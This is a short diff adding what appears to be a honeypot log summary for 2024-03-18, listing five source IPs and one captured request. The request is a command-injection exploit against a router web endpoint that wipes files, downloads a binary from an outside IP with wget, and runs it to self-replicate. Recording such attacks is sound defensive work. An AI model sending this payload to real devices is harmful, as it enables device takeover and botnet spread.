@@ -1,0 +1,16 @@
+Top 5 IPs for 2024-03-18 :
+
+193.34.55.83
+84.22.143.118
+168.232.15.171
+67.159.233.146
+185.166.27.167
+
+Malcious Commands seen:
+POST /goform/set_LimitClient_cfg HTTP/1.1
+Cookie: user=admin
+
+time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf *mpsl*;wget http://103.245.236.156/huhu.mpsl; chmod 777 huhu.mpsl; ./huhu.mpsl lblink.selfrep;rm -rf *mpsl*;
+
+
+
